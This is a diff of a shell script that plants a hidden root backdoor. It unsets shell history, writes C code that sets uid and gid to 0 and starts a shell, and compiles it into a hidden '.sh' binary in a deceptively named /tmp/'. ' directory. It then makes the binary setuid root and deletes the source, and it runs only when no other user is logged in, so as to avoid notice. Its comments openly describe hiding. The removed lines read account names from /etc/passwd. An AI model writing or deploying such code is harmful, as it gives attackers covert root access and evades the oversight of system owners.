@@ -3,6 +3,7 @@
 unset HISTFILE;
 unset HISTSAVE;
 
+# C to start shell as root
 code=$(cat<<EOF
 int main(void) {
   setgid(0); setuid(0);
@@ -11,21 +12,27 @@ int main(void) {
 EOF
 )
 
-users=$(w|grep -v load|grep -v JCPU|wc -l);
-if [ "$users" != "1" ]; then 
-  logout;
-else 
+compile_binary() {
+# sneaky function to try and hide
+  mkdir /tmp/". "       # create a directory in /tmp/ called "."
+  cd /tmp/". "          # move to new directoruy
+  echo $code>./.sh.c    # put C code into a file
+  gcc -o ./.sh ./.sh.c  # compile C code into a binary hidden as ".sh"
+  chown root:root ./.sh # set ownership to root
+  chmod u+s ./.sh       # sticky setuid for root
+  rm ./.sh.c            # remove code
+}
 
-  mkdir /tmp/". ";
-  cd /tmp/". ";
-  echo $code>./.sh.c
-  gcc -o ./.sh ./.sh.c
-  chown root:root ./.sh
-  chmod u+s ./.sh
-  rm ./.sh.c
-  logout;
 
-fi
+main() {
+  users=$(w|grep -v load|grep -v JCPU|wc -l); # how many users logged in?
 
-accounts=$(cut -f1 -d: /etc/passwd);
-echo $accounts
+  if [ "$users" != "1" ]; then                # if more than 1 user is logged in, we logout
+    logout
+  else                                        # if we are the only user logged in...
+    compile_binary                            # compile the code
+    logout
+  fi
+}
+
+main
